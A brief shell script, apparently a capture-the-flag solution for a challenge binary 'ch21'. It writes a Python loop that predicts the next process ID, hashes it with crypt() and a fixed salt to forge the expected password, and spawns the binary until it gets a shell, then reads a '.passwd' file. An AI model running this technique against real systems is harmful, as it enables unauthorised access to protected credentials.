# ssh ... < commands.sh
# needs manual intervention

cat << 'EOF' > /tmp/crack_ch21.py
import subprocess
import crypt

p = subprocess.Popen(['./ch21'])
pid = p.pid
print('initial', pid)

while 1:
    pid += 1
    print(pid)
    arg = crypt.crypt(str(pid), '$1$awesome')
    p = subprocess.Popen(['./ch21', arg])
    pid = p.pid
    p.wait()
EOF

python3 /tmp/crack_ch21.py

# enter "cat .passwd" in the shell